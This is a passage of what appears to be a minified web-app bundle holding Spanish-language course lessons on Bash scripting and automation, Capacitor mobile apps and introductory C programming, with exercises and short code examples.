Crea un script que reciba un nombre como argumento y cree una carpeta con ese nombre, luego entre en ella y cree un \`index.html\`. 
Ejemplo: \`./crear-sitio.sh mi-web\`
`,completed:!1},{id:"bash-07-condiciones-loops",title:"Lgica - Condiciones y Bucles",level:"semi-senior",content:`# Leccin 07: Lgica - Condiciones y Bucles

Un script profesional debe poder tomar decisiones: "Si el archivo existe, haz esto; si no, haz aquello".

## 1. Condicionales (\`if\`)
La sintaxis de Bash es un poco especial con los espacios en los corchetes \`[ ]\`.
\`\`\`bash
if [ "$1" == "admin" ]; then
    echo "Hola Jefe"
else
    echo "Acceso Denegado"
fi
\`\`\`
*   \`-f archivo\`: Existe el archivo?
*   \`-d carpeta\`: Existe la carpeta?

## 2. Bucles (\`for\`)
Ideal para procesar muchos archivos a la vez.
\`\`\`bash
for ARCHIVO in *.jpg; do
    echo "Procesando $ARCHIVO..."
    mv "$ARCHIVO" "backup_$ARCHIVO"
done
\`\`\`

## 3. Cdigos de Salida (Exit Codes)
Cada comando que ejecutas le dice a Bash si termin bien o mal.
*   \`0\`: Todo sali bien.
*   Cualquier otro nmero: Hubo un error.
T puedes forzar esto en tus scripts con \`exit 0\` o \`exit 1\`.

---

### Misin Semi-Senior:
Automatizar tareas de mantenimiento. Por ejemplo, un script que busque todos los archivos \`.tmp\` y los borre, pero solo si tienen ms de 7 das de antigedad.

### Ejercicio 7:
Escribe un script que recorra todos los archivos \`.sh\` de la carpeta actual y les de permisos de ejecucin automticamente usando un \`for\`.
`,completed:!1},{id:"bash-08-funciones-automatizacion",title:"Funciones y Automatizacin Real",level:"semi-senior",content:`# Leccin 08: Funciones y Automatizacin Real

Para que tus scripts no sean fideos de cdigo ilegibles, usamos funciones, igual que en JavaScript.

## 1. Definir Funciones
\`\`\`bash
imprimir_error() {
    echo "[ERROR] $1"
    exit 1
}

# Uso:
if [ -z "$1" ]; then
    imprimir_error "Debes pasar un argumento"
fi
\`\`\`

## 2. Automatizacin en el mundo real
Como Semi-Senior, ya no haces scripts solo para borrar archivos. Los usas para:
*   **Backup automtico:** Un script que comprima una carpeta y la suba a un servidor.
*   **Instalador inicial:** Un script que instale todas las herramientas (Node, Git, Docker) cuando llega un programador nuevo.
*   **Monitoreo:** Un script que revise si un sitio web est cado y enve una notificacin.

## 3. El archivo .bashrc (o .zshrc)
No todos los scripts tienen que vivir en archivos sueltos. Puedes crear **Alias** (atajos) en tu configuracin personal.
*   \`alias up="git add . && git commit -m 'update' && git push"\`
Ahora solo escribes \`up\` en la terminal y hace todo eso por ti.

---

### Verdad Semi-Senior:
"No gastes 2 horas automatizando una tarea que tardas 10 segundos en hacer a mano... a menos que esa tarea la tengas que hacer todos los das por el resto de tu vida".

### Ejercicio Prctico 8:
Crea un script que comprima la carpeta \`logs\` en un archivo \`.tar.gz\` (puedes buscar cmo usar el comando \`tar\`) y le ponga la fecha actual al nombre del archivo.
`,completed:!1},{id:"bash-09-practica-semi-senior",title:"Bash Semi-Senior",level:"semi-senior",content:"# Ejercicios y Evaluacin: Bash Semi-Senior\n\nDemuestra que puedes programar la terminal para que trabaje por ti.\n\n---\n\n## 1. Ejercicio: El Validador de Backups\n**Escenario:** Tienes un script que hace backups. Necesitas que antes de empezar, verifique que la carpeta `destino` exista.\n*Consigna:* Escribe el fragmento de `if` que verifique si la carpeta existe y, si no existe, la cree usando `mkdir`.\n\n## 2. Ejercicio: El Renombrador Masivo\n**Escenario:** Tienes una carpeta con 50 archivos `.txt`. Quieres que todos pasen a llamarse `.md`.\n*Consigna:* Escribe un bucle `for` que haga este cambio de extensin para todos los archivos.\n\n## 3. Evaluacin: Lgica de Scripting\n*   Qu diferencia hay entre `$@` y `$#`?\n*   Cmo guardas el resultado del comando `whoami` en una variable llamada `USUARIO`?\n*   Explica qu significa que un comando devuelva un exit code de `0` vs `1`.\n\n---\n\n### Resultado esperado:\nScripts que no solo funcionen, sino que sean elegantes, manejen errores y sean fciles de leer para otros compaeros. \n",completed:!1,isProject:!0},{id:"bash-10-scripts-robustos",title:"Scripts Robustos y Manejo de Errores",level:"senior",content:'# Leccin 10: Scripts Robustos y Manejo de Errores\n\nEn produccin, un script de Bash no puede fallar silenciosamente. Como Senior, diseas scripts que son predecibles y seguros.\n\n## 1. El modo "Seguro" de Bash\nAl principio de tus scripts, usa siempre:\n```bash\nset -euo pipefail\n```\n*   `-e`: El script se detiene inmediatamente si un comando falla.\n*   `-u`: Falla si intentas usar una variable no definida.\n*   `-o pipefail`: Si una tubera (`|`) falla en el medio, todo el comando falla.\n\n## 2. Captura de Errores con `trap`\n`trap` permite ejecutar una funcin justo antes de que el script termine o si ocurre un error inesperado (limpieza de archivos temporales, logs de error).\n```bash\ncleanup() {\n  echo "Limpiando archivos antes de salir..."\n}\ntrap cleanup EXIT\n```\n\n## 3. Manejo de Errores Manual\nUsa el cdigo de salida (`$?`) para tomar decisiones crticas.\n```bash\ncp archivo.txt /backup/ || { echo "Error al copiar"; exit 1; }\n```\n\n---\n\n### Visin Senior:\nUn script robusto comprueba que todas las herramientas necesarias (`docker`, `git`, `npm`) estn instaladas antes de empezar a trabajar. Usa `command -v <comando>` para esto.\n',completed:!1},{id:"bash-10-sed-awk-ninja",title:"Procesamiento de Texto Ninja - Sed y Awk",level:"senior",content:`# Leccin 10: Procesamiento de Texto Ninja - Sed y Awk

En el nivel Senior, no solo mueves archivos; transformas datos masivos sin abrir un editor de texto. Para eso existen dos herramientas legendarias.

## 1. Sed: El Editor de Flujo
Sirve para buscar y reemplazar texto en archivos gigantes de forma instantnea.
*   **Comando:** \`sed -i 's/viejo/nuevo/g' archivo.txt\`
    *   \`-i\`: Modifica el archivo real (in-place).
    *   \`s\`: Sustituir.
    *   \`g\`: Global (todas las veces que aparezca).

## 2. Awk: El Procesador de Columnas
Awk es casi un lenguaje de programacin por s solo. Es imbatible para procesar archivos CSV o Logs con columnas.
*   **Ejemplo:** \`awk '{print $1, $3}' logs.txt\`
    *   Muestra solo la primera y la tercera columna de cada lnea de un archivo.

## 3. Combinando el Arsenal
\`cat data.csv | awk -F',' '{print $2}' | sed 's/"//g' | sort | uniq\`
1. Leemos el archivo.
2. Sacamos la segunda columna (separada por comas).
3. Quitamos las comillas.
4. Ordenamos alfabticamente.
5. Quitamos los duplicados.
**Visin Senior:** Has procesado miles de registros en una sola lnea de comando.

---

### Desafo Senior:
Imagina que te pasan un archivo de configuracin de 5,000 lneas y tienes que cambiar el puerto \`8080\` por \`9000\` en todos lados menos en las lneas que estn comentadas con \`#\`. Cmo lo haras con \`sed\`?
`,completed:!1},{id:"bash-11-cron-devops",title:"Cron Jobs y Automatizacin DevOps",level:"senior",content:`# Leccin 11: Cron Jobs y Automatizacin DevOps

El corazn de un servidor es su capacidad de ejecutar tareas sin supervisin humana.

## 1. Cron Jobs a Fondo
Usa \`crontab -e\` para editar tus tareas.
*   \`0 3 * * * /path/to/backup.sh\`: Ejecuta el backup todos los das a las 3:00 AM.
*   **Regla Senior:** Redirige siempre la salida de tus cron jobs a un archivo de log:
    \`0 3 * * * /path/to/script.sh >> /var/log/cron_resumen.log 2>&1\`

## 2. Automatizacin DevOps (CI/CD)
Los archivos de configuracin de GitHub Actions o GitLab CI usan Bash por debajo.
*   **Scripts de despliegue:** Scripts que detienen contenedores viejos, descargan la nueva imagen de Docker y encienden los nuevos.
*   **Health Checks:** Scripts que hacen \`curl\` a tu servidor y, si no responde, reinician el servicio automticamente.

## 3. Uso de \`rsync\` para despliegues rpidos
En lugar de copiar todo, \`rsync\` solo enva los archivos que cambiaron. Es la base de muchos sistemas de deploy profesionales.

---

### Caso Real Senior:
Diseaste un script que detecta si el disco duro est al 90% de capacidad y borra automticamente los logs ms viejos de 30 das para evitar que el servidor se congele.
`,completed:!1},{id:"bash-11-sysadmin-cron",title:"Administracin de Sistemas y Redes",level:"senior",content:`# Leccin 11: Administracin de Sistemas y Redes

Ms all de los archivos, un Senior domina el sistema operativo y la red desde la terminal.

## 1. Tareas Programadas (\`Cron\`)
\`Crontab\` es la herramienta que le dice al sistema: "Ejecuta este script todos los lunes a las 3 AM".
*   Sintaxis: \`* * * * * comando\` (Minuto Hora Da Mes Semana).
*   **Caso Senior:** Backup de la base de datos de produccin cada medianoche sin intervencin humana.

## 2. Gestin de Procesos
*   \`top\` / \`htop\`: Ver qu aplicaciones estn consumiendo toda la RAM/CPU.
*   \`kill -9 PID\`: Forzar el cierre de un proceso que se qued colgado.
*   \`ps aux\`: Listar absolutamente todo lo que est corriendo en el servidor.

## 3. Redes y Debugging
*   \`ssh user@host\`: Conectarse de forma segura a un servidor remoto.
*   \`curl -I https://google.com\`: Ver los encabezados de respuesta de un sitio para saber por qu falla (debugging de APIs).
*   \`netstat -tuln\`: Ver qu puertos estn abiertos en tu servidor.

---

### Misin Senior:
Manejar un servidor "Headless" (sin monitor). Debes ser capaz de entrar por SSH, ver por qu la base de datos est lenta, matar procesos innecesarios y revisar los logs de red.

### Ejercicio 11:
Investiga cmo configuraras un \`cron\` para que borre el contenido de la carpeta \`/tmp\` cada domingo a las 11:59 PM.
`,completed:!1},{id:"bash-12-practica-senior",title:"Evaluacin Senior: Master de la Terminal",level:"senior",content:`# Evaluacin Senior: Master de la Terminal

Demuestra tu nivel arquitectnico y operativo resolviendo estos escenarios crticos.

---

## 1. El Desafo del Log Gigante (Sed/Awk)
**Escenario:** Tienes un archivo de logs de 10GB. Necesitas extraer todas las direcciones IP nicas que intentaron acceder al endpoint \`/admin\` y fallaron (Status 401).
*Consigna:* Describe los pasos y los comandos (usando \`grep\`, \`awk\`, \`sort\`, \`uniq\`) que usaras para obtener esa lista negra de IPs.

## 2. El Desafo de la Automatizacin Robusta
**Escenario:** Debes crear un script de despliegue que:
1. Haga un \`git pull\`.
2. Verifique si el comando anterior fue exitoso.
3. Si fall, enve un mail de error y se detenga.
4. Si funcion, reinicie el servicio de Node.js.
*Consigna:* Escribe el fragmento de Bash que maneje esa lgica de error (\`if [ $? -ne 0 ]; then ...\`).

## 3. Discusin Tcnica
*   Por qu un Senior prefiere \`ssh\` con llaves pblicas/privadas en lugar de contraseas?
*   Qu es un proceso "Zombie" en Linux y cmo lo detectaras?
*   Cundo usaras un lenguaje como Python en lugar de Bash para automatizar una tarea?

---

### Recordatorio Final:
Un verdadero Senior no es el que sabe ms comandos de memoria, sino el que sabe consultar el manual y combinar las herramientas existentes para construir soluciones indestructibles. 
`,completed:!1,isProject:!0}]},iD={id:"capacitor-module",title:"Capacitor",description:"Convierte tus aplicaciones web en aplicaciones nativas para iOS y Android con una sola base de cdigo.",completed:!1,track:"Mobile",lessons:[{id:"capacitor-intro",title:"Qu es Capacitor?",level:"junior",content:`# Leccin 1: Qu es Capacitor?

Capacitor es un **runtime nativo multiplataforma** que te permite construir aplicaciones mviles nativas usando tecnologas web (HTML, CSS y JavaScript).

## 1. Por qu Capacitor?
A diferencia de alternativas como React Native o Flutter, Capacitor te permite:
*   Usar cualquier framework web (React, Vue, Angular) o incluso JS puro.
*   Acceder a APIs nativas (Cmara, GPS, Bluetooth) con una sintaxis simple.
*   Mantener una sola base de cdigo para Web, iOS y Android.

## 2. Capacitor vs Cordova
Capacitor es el sucesor espiritual de Cordova, pero con mejoras clave:
*   **Gestin Nativa:** Los proyectos de iOS y Android son parte de tu repositorio, no artefactos generados.
*   **APIs Modernas:** Usa Promesas y async/await por defecto.
*   **Web First:** Tu app primero es una web app de calidad, y luego se "envuelve" para mvil.

## 3. El flujo de trabajo
1.  Construyes tu aplicacin web (ej: \`npm run build\`).
2.  Capacitor "copia" esos archivos en los proyectos nativos (\`npx cap copy\`).
3.  Abres el IDE nativo (Xcode o Android Studio) para compilar y ejecutar.

---
## Mini Ejercicio
Si ya tienes una aplicacin en React, qu crees que sera lo ms difcil de adaptar para que funcione en un celular?
`,completed:!1},{id:"capacitor-setup",title:"Instalacin y Configuracin",level:"junior",content:`# Leccin 2: Instalacin y Configuracin

Configurar Capacitor en un proyecto existente es extremadamente sencillo.

## 1. Instalacin
Dentro de tu proyecto web, ejecuta:
\`\`\`bash
npm install @capacitor/core @capacitor/cli
\`\`\`

## 2. Inicializacin
Luego, inicializa Capacitor:
\`\`\`bash
npx cap init
\`\`\`
Te pedir el nombre de la app y un ID de paquete (ej: \`com.miproyecto.app\`).

## 3. Agregar plataformas
Para agregar iOS o Android, necesitas instalar los paquetes correspondientes:
\`\`\`bash
npm install @capacitor/android @capacitor/ios
npx cap add android
npx cap add ios
\`\`\`

## 4. Requisitos del sistema
Recuerda que para compilar necesitars:
*   **Android:** Android Studio y el SDK de Android.
*   **iOS:** macOS y Xcode.

---
## Mini Ejercicio
Intenta ejecutar \`npx cap init\` en una carpeta de prueba. Qu archivos nuevos se crean en la raz del proyecto?
`,completed:!1},{id:"capacitor-plugins",title:"Uso de Plugins Nativos",level:"semi-senior",content:`# Leccin 3: Uso de Plugins Nativos

La verdadera magia de Capacitor est en su ecosistema de plugins, que te dan acceso al hardware del dispositivo.

## 1. Ejemplo: La Cmara
Primero instalas el plugin:
\`\`\`bash
npm install @capacitor/camera
\`\`\`

## 2. Uso en el cdigo
Importas y usas como una funcin asncrona normal:
\`\`\`typescript
import { Camera, CameraResultType } from '@capacitor/camera';

const takePicture = async () => {
  const image = await Camera.getPhoto({
    quality: 90,
    allowEditing: true,
    resultType: CameraResultType.Uri
  });

  // La imagen est lista para mostrarse en un <img>
  const imageUrl = image.webPath;
};
\`\`\`

## 3. Permisos
Capacitor maneja los permisos por ti, pero debes declararlos en los archivos de configuracin nativos (\`AndroidManifest.xml\` para Android o \`Info.plist\` para iOS).

## 4. Toast y Notificaciones
Capacitor ofrece plugins oficiales para casi todo:
*   \`@capacitor/toast\`: Mensajes flotantes rpidos.
*   \`@capacitor/local-notifications\`: Notificaciones locales.
*   \`@capacitor/geolocation\`: Ubicacin por GPS.

---
## Ejercicio Prctico
Imagina que ests creando una app de Bitcora de Viajes. Qu 3 plugins de Capacitor seran indispensables y para qu los usaras?
`,completed:!1},{id:"capacitor-build",title:"Despliegue y Live Reload",level:"semi-senior",content:`# Leccin 4: Despliegue y Live Reload

Durante el desarrollo, no querrs reconstruir la app cada vez que cambies un botn.

## 1. El comando Sync
Cada vez que haces cambios en tu cdigo web y ejecutas un build, debes sincronizar con los proyectos nativos:
\`\`\`bash
npx cap sync
\`\`\`
Este comando hace un \`copy\` (copia archivos) y un \`update\` (instala dependencias nativas).

## 2. Live Reload
Puedes ejecutar tu app en el dispositivo real pero que cargue el cdigo desde tu servidor de desarrollo local:
\`\`\`bash
npx cap run android --livereload --external
\`\`\`
Esto es extremadamente productivo.

## 3. Generacin de Binarios
Finalmente, para publicar en las tiendas:
*   **Android:** Abre en Android Studio y selecciona \`Build > Generate Signed Bundle / APK\`.
*   **iOS:** Abre en Xcode y selecciona \`Product > Archive\`.

---
## Evaluacin Final
1. Cul es el comando que sincroniza los cambios web con los nativos?
2. Necesitas saber Java o Swift para usar plugins bsicos en Capacitor?
3. Qu herramienta de desarrollo es obligatoria para compilar apps de iOS?
`,completed:!1,isProject:!0}]},u1={id:"c-lang",title:"C Profesional: Arquitectura y Sistemas",description:"Domina el lenguaje C desde las bases del hardware hasta la arquitectura de sistemas, gestin de memoria y seguridad.",completed:!1,lessons:[{id:"c-junior-01",title:"Leccin 1: Bienvenido al Lenguaje de los Dioses (C 101)",level:"junior",content:`# Leccin 1: Bienvenido al Lenguaje de los Dioses (C 101)

## 1. Qu es C y por qu te importa?
Bienvenido a la "Madre" de casi todos los lenguajes modernos. Si has usado JavaScript, Java, Python o C#, ya conoces un poco de C sin saberlo, porque todos copiaron su estilo.

**C es el lenguaje del poder.** Creado por Dennis Ritchie en los Laboratorios Bell (1972), naci para que los humanos pudieran escribir Sistemas Operativos sin volverse locos con el lenguaje Ensamblador.

**C es el lenguaje que mueve el mundo:**
- **Sistemas Operativos**: Windows, macOS, Linux, iOS y Android estn escritos mayormente en C/C++.
- **Navegadores**: El motor V8 de Chrome (JS) y el motor de renderizado de Safari.
- **Sistemas Embebidos**: El firmware de tu auto, del GPS de un avin y del procesador dentro de una cafetera.
- **Otros Lenguajes**: Los intrpretes de Python y Ruby estn escritos en C.

Aprender C no es solo aprender a programar; es aprender **cmo piensan las computadoras** y cmo fluyen los electrones por la memoria.

## 2. Anatoma de tu primer programa
\`\`\`c
#include <stdio.h> // Paso 1: Pedir herramientas

// Paso 2: El punto de entrada universal
int main() {
    // Paso 3: Dar una orden
    printf("Hola, mundo de C!\\n");
    
    // Paso 4: Reportar xito al Sistema Operativo
    return 0;
}
\`\`\`

###  Anlisis de Ingeniera (Nada es magia!)
1.  **\`#include <stdio.h>\`**: C es minimalista. No sabe ni "hablar". Le pedimos prestado el archivo de cabecera \`stdio.h\` (Standard Input/Output) para usar la funcin \`printf\`.
2.  **\`int main()\`**: Tu CPU no lee archivos de arriba a abajo como un cuento. Busca una "etiqueta" especfica llamada \`main\` para empezar. La palabra \`int\` significa que, al terminar, el programa entregar un nmero entero al sistema.
3.  **\`{ ... }\`**: Delimitan el "Scope" o alcance. Todo lo que nace aqu, muere cuando se llega a la llave de cierre.
4.  **\`\\n\`**: Es el "newline". Si no lo pones, el siguiente texto aparecer pegado. En C, t controlas cada pixel de texto.
5.  **\`;\`**: El punto y coma es el "punto final" de una instruccin. Olvidarlo es como dejar una frase sin terminar: la computadora se confunde.

## 3. Por qu C es "difcil"?
No es difcil, es **transparente**.
- En Python, un robot (Garbage Collector) limpia tu basura. En C, t eres el dueo de casa.
- En Java, la mquina virtual te protege. En C, tienes lnea directa con la memoria RAM.
- **Mantra del Programador de C**: "Tengo el control total, por lo tanto, tengo la responsabilidad total".

---

##  Historia para el Caf
C se llama as porque es el sucesor de un lenguaje llamado **B**. Ken Thompson y Dennis Ritchie necesitaban algo ms potente para reescribir UNIX. C fue tan bueno que 50 aos despus sigue siendo el rey de la infraestructura.

##  Mini-Reto
Intenta modificar el cdigo para que imprima dos lneas diferentes. Qu pasa si quitas el \`;\` de la primera lnea e intentas compilar? El mensaje de error dir \`expected ';' before '...'\`. Aprende a leer los errores, son tus mejores amigos.
`,completed:!1},{id:"c-junior-02",title:"Leccin 2: El Pipeline de Compilacin (De Texto a Mquina)",level:"junior",content:`# Leccin 2: El Pipeline de Compilacin (De Texto a Mquina)

## 1. C no se "ejecuta", se "construye"
En JavaScript, el navegador lee tu cdigo y lo hace funcionar al instante. En C, tu cdigo es una **receta escrita** que primero debe convertirse en un **plato terminado (un ejecutable)**.

A este proceso de transformacin lo llamamos **Compilacin**.

## 2. Los 4 pasos de la transformacin
Imagina que ests escribiendo una carta formal:

1.  **Preprocesador**: Revisas que no falte nada y pegas trozos de otros textos (como el \`#include\`).
2.  **Compilador**: Traduces tu carta del espaol (C) a un lenguaje ultra-especfico (Ensamblador).
3.  **Ensamblador**: Pasas ese texto a un cdigo secreto de ceros y unos que solo la CPU entiende.
4.  **Enlazador (Linker)**: Pegas las ltimas piezas que te faltaban (como la herramienta \`printf\`) para que el paquete est listo para enviar.

## 3. Qu herramienta usamos?
Usamos un programa llamado **GCC** (o Clang). Es el traductor oficial.
Cuando escribes en tu terminal:
\`\`\`bash
gcc hola.c -o mi_programa
\`\`\`
Le ests diciendo: *"Traduce mi archivo 'hola.c' y llmalo 'mi_programa'"*. Luego lo corres con \`./mi_programa\`.

## 4. Tipos de errores (No entres en pnico)
- **Error de compilacin**: Te equivocaste al escribir (falta un \`;\`). El traductor te avisa antes de terminar.
- **Error de ejecucin**: El cdigo se tradujo bien, pero al correrlo hizo algo que rompi la computadora (como dividir por cero).

---

##  Pro-Tip
Si ves un mensaje de error gigante en la terminal, no leas todo. Lee la **primera lnea**. Generalmente te dice el archivo y la fila exacta donde te olvidaste ese dichoso punto y coma.
`,completed:!1},{id:"c-junior-03",title:"Leccin 3: Variables: Cajas con tipos rgidos",level:"junior",content:`# Leccin 3: Variables: Cajas con tipos rgidos

## 1. En C, la memoria es sagrada
En Python dices \`x = 10\`. En C dices: *"Computadora, por favor reserva un espacio de exactamente 4 bytes porque voy a guardar un nmero entero ah"*.

Declarar variables en C es como alquilar departamentos en la memoria RAM: tienes que firmar el contrato antes de mudarte.

## 2. Los Tipos de Datos (El ADN de C)

| Tipo | Tamao (aprox) | Rango | Uso |
| :--- | :--- | :--- | :--- |
| \`char\` | 1 byte | -128 a 127 | Letras o nmeros pequeos. |
| \`int\` | 4 bytes | +/- 2 mil millones | Contadores, edad, IDs. |
| \`float\` | 4 bytes | 7 decimales | Precios, sensores simples. |
| \`double\` | 8 bytes | 15 decimales | Ciencia, finanzas, alta precisin. |

###  El tamao importa: \`sizeof\`
El tamao de un \`int\` puede variar si ests en una computadora de 32 bits o de 64 bits. Para ser un pro, usa la funcin \`sizeof()\`:
\`\`\`c
printf("Un entero ocupa %zu bytes\\n", sizeof(int));
\`\`\`

## 3. Declarar vs. Inicializar (El peligro de la "Basura")
Si solo haces \`int puntos;\`, esa variable contiene **BASURA**. 
Qu es la basura? Son los ceros y unos que quedaron en la RAM de cuando otra aplicacin us ese espacio hace un segundo. 

**Regla de Oro**: Siempre, SIEMPRE inicializa tus variables: \`int puntos = 0;\`.

## 4. Modificadores (Afinando la Memoria)
- **\`unsigned\`**: Solo nmeros positivos. Ganas el doble de rango positivo (un \`unsigned char\` va de 0 a 255).
- **\`const\`**: La variable se vuelve solo de lectura. Si intentas cambiarla, el compilador te regaar.

## 5. Binario y Complemento a Dos (Nivel Pro)
Sabas que C guarda los nmeros negativos usando un truco llamado "Complemento a dos"? El bit ms a la izquierda se usa para decir si es positivo (0) o negativo (1). Si no tienes cuidado con el tipo de dato, puedes tener un "Overflow" y un nmero muy grande se convertir en negativo de repente.

---

##  Reto Tcnico
Si tienes un \`unsigned char\` (mximo 255) y le sumas 1, qu pasa?
A) Da error.
B) Explota la PC.
C) Vuelve a 0.
*(Respuesta: C. Se llama desbordamiento o Wrap-around).*

##  Mantra de C
"Dime qu tipo de dato usas y te dir cunta RAM desperdicias".
`,completed:!1},{id:"c-junior-04",title:"Leccin 4: Operadores: Hablando con el Procesador",level:"junior",content:'# Leccin 4: Operadores: Hablando con el Procesador\n\n## 1. Operadores Aritmticos\nYa conoces `+`, `-`, `*`, `/`. Pero en C, la divisin de enteros tiene un "secreto":\n- Si haces `5 / 2`, el resultado es `2`, NO `2.5`. Por qu? Porque un `int` no puede guardar decimales. \n- Para obtener `2.5`, necesitas que al menos uno de los nmeros sea flotante: `5.0 / 2`.\n\n**El Mdulo `%` (El resto):** \nUsa `%` para saber si un nmero es par (`n % 2 == 0`) o para crear bucles que den la vuelta (ej: un reloj de 24 horas: `horas % 24`).\n\n## 2. Operadores de Incremento (C++)\n`x++` y `++x` parecen iguales, pero no lo son en el mundo real:\n- `x++`: Usa el valor actual y LUEGO le suma 1.\n- `++x`: Suma 1 y LUEGO usa el nuevo valor.\n*En un bucle simple da igual, pero en expresiones complejas, esto puede causar bugs invisibles.*\n\n## 3. Operadores Lgicos y Branching\n- `&&` (AND): Solo es verdad si AMBOS son verdad.\n- `||` (OR): Es verdad si CUALQUIERA es verdad.\n- `!` (NOT): Invierte la verdad.\n\n**Truco de Optimizacin (Cortocircuito):**\nSi haces `(a == 0 && b == 10)`, y la computadora ve que `a` NO es 0, ni siquiera se molesta en mirar cunto vale `b`. Esto ahorra ciclos de CPU.\n\n## 4. Operadores de Bitwise (Nivel Bajo Nivel)\nAqu es donde C brilla. Puedes manipular los bits individuales:\n- `&` (Bitwise AND): til para "mascarar" bits (ej: saber si un interruptor est encendido).\n- `|` (Bitwise OR): til para encender bits especficos.\n- `<<` y `>>`: Desplazamiento de bits. `x << 1` es la forma ms rpida de multiplicar por 2!\n\n## 5. El peligro de Asignacin vs Comparacin\n- `x = 10`: Accion (Asignar).\n- `x == 10`: Pregunta (Comparar).\n*Si escribes `if (x = 0)`, C pondr `x` en 0 y dir que la condicin es Falsa siempre. Ten cuidado!*\n\n---\n\n##  Curiosidad\nEl lenguaje C++ se llama as porque es "C incrementado" (`C++`). Es un chiste de programadores que ha durado 40 aos.\n\n##  Ejercicio\nCmo podras saber si el tercer bit de un nmero est encendido usando `&`?\n(Pista: `numero & (1 << 2)`).\n',completed:!1},{id:"c-junior-05",title:"Leccin 5: Condicionales: Arquitectura de Decisiones",level:"junior",content:`# Leccin 5: Condicionales: Arquitectura de Decisiones

## 1. El \`if\` - \`else\` (La bifurcacin)
Tu programa llega a un cruce de caminos. 

\`\`\`c
if (temperatura > 100) {
    printf("Peligro! Sistema fuera de control \\n");
} else {
    printf("Operacin normal \\n");
}
\`\`\`

## 2. Verdad Matemtica en C
En otros lenguajes existe un tipo de dato llamado \`bool\`. En C original (C89), **el 0 es Falso y cualquier otra cosa es Verdadero**.
- \`if (1)\` es siempre verdad.
- \`if (-5)\` es siempre verdad.
- \`if (0)\` es siempre falso.
*En C moderno (C99 en adelante), puedes incluir \`<stdbool.h>\` para usar \`true\` y \`false\`, pero por debajo siguen siendo 1 y 0.*

## 3. El Operador Ternario (El if de una sola lnea)
Para decisiones rpidas, no uses 5 lneas de cdigo:
\`\`\`c
int max = (a > b) ? a : b;
\`\`\`
Se lee: *"Si a es mayor que b, dame a, de lo contrario dame b"*. salo con moderacin, abusar de esto hace que tu cdigo parezca jeroglficos.

## 4. \`switch\`: El Distribuidor de Alta Velocidad
Cuando tienes un men de opciones fijas (1, 2, 3...), el \`switch\` es tu mejor amigo.
- **Dato Tech**: El compilador a veces crea una "Jump Table" (tabla de saltos) para el switch, lo que hace que saltar a la opcin 1000 sea tan rpido como saltar a la opcin 1.

> [!CAUTION]
> No olvides el \`break\`! Si no lo pones, el cdigo seguir hacia abajo ejecutando todas las opciones sin preguntar (esto se llama *Fall-through*).

## 5. Estilo Profesional
Evita el "Cdigo Flecha":
\`\`\`c
if (hay_conexion) {
    if (hay_permisos) {
        if (hay_espacio) {
            // ... mucho cdigo indentado hacia la derecha
        }
    }
}
\`\`\`
**Tip Senior**: Usa "Guard Clauses" (Clusulas de Guardia). Sal rpido si algo est mal:
\`\`\`c
if (!hay_conexion) return;
if (!hay_permisos) return;
// El cdigo principal se queda a la izquierda, fcil de leer.
\`\`\`

---

##  Ejercicio
Crea un programa que pida una letra y diga si es una vocal o una consonante usando un \`switch\`.

##  Mantra
"Un buen cdigo no es el que tiene ms if, sino el que los usa en el momento exacto".
`,completed:!1},{id:"c-junior-06",title:"Leccin 6: Bucles: Que la mquina trabaje por ti",level:"junior",content:`# Leccin 6: Bucles: Que la mquina trabaje por ti

## 1. El ciclo infinito de la computacin
Las computadoras no se cansan de repetir. Un bucle (loop) permite ejecutar el mismo bloque de cdigo miles de veces sin gastar lneas extra.

## 2. El bucle \`for\` (La precisin matemtica)
Ideal cuando sabes cuntas veces vas a iterar.
\`\`\`c
// Estructura: (Inicio; Condicin; Actualizacin)
for (int i = 0; i < 10; i++) {
    printf("%d ", i);
}
\`\`\`
**Anlisis de Bajo Nivel:**
- El compilador usa una instruccin de "salto" (\`JMP\` o \`BNE\` en ensamblador) para volver al inicio del bloque si la condicin se cumple.
- **Tip Senior**: Puedes omitir partes del for. \`for(;;)\` es un bucle infinito legal en C.

## 3. El bucle \`while\` (La espera atenta)
Se usa cuando la repeticin depende de algo que no controlas (como un sensor o la entrada del usuario).
\`\`\`c
while (servidor_activo) {
    procesar_pedido();
}
\`\`\`
**Peligro**: Si olvidas cambiar la variable \`servidor_activo\` dentro del bucle, tendrs un **Bucle Infinito** que consumir el 100% de un ncleo de tu CPU.

## 4. \`do-while\` (Primero dispara, luego pregunta)
A diferencia de los otros, este **siempre se ejecuta al menos una vez**. 
- Muy comn en mens de terminal: "Muestra las opciones, y si el usuario no elige Salir, vuelve a mostrar".

## 5. Control de Flujo: \`break\` y \`continue\`
- **\`break\`**: Rompe el bucle y sale de inmediato. til cuando encontraste lo que buscabas.
- **\`continue\`**: Salta el resto de cdigo en la vuelta actual y va directo a la siguiente.

## 6. Optimizacin: Loop Unrolling
Cuando el rendimiento es crtico, los compiladores "desenrollan" los bucles. En lugar de hacer 4 vueltas, escriben el cdigo 4 veces seguidas. Esto ahorra la "pregunta" de la condicin y hace que el programa sea ms lineal y rpido para la CPU.

---

##  Historia
En los viejos tiempos, los programadores usaban \`goto\` para saltar de un lado a otro. Era tan catico que se inventaron los bucles para dar orden. **Nunca uses \`goto\`** a menos que ests escribiendo drivers del Kernel de Linux.

##  Ejercicio
Escribe un bucle \`for\` que cuente hacia atrs, del 10 al 1.

##  Mantra
"Si puedes explicarlo como un bucle, puedes automatizarlo para siempre".
`,completed:!1},{id:"c-junior-07",title:"Leccin 7: Funciones: Tus propios comandos",level:"junior",content:`# Leccin 7: Funciones: Tus propios comandos

## 1. Modularidad: Divide y Vencers
Programar no es escribir un archivo gigante de arriba abajo. Es crear pequeas "fbricas" llamadas **Funciones** que procesan datos y devuelven un resultado.

## 2. El arte de definir funciones
Una funcin bien hecha necesita tres cosas:
\`\`\`c
float calcular_iva(float precio) { // Firma: Qu devuelve, Nombre, Qu recibe
    float iva = precio * 0.21;
    return iva;                   // Resultado
}
\`\`\`

### El tipo \`void\` (Vaco)
Y si una funcin no tiene que devolver nada? (ej: solo imprimir en pantalla). Usas \`void\`.
\`\`\`c
void saludar() {
    printf("Bienvenido, Usuario!\\n");
}
\`\`\`

## 3. El Call Stack (La Pila de Llamadas)
Cuando llamas a una funcin, la CPU "pausa" el \`main\` y guarda su estado en un estante llamado **Stack**. 
- Abre un nuevo espacio para las variables de la funcin.
- Al terminar (\`return\`), borra todo eso y vuelve al \`main\` justo donde lo dej.
*Si una funcin se llama a s misma infinitas veces, el estante se llena y ocurre el famoso **Stack Overflow**.*

## 4. Paso por Valor (La Fotocopia)
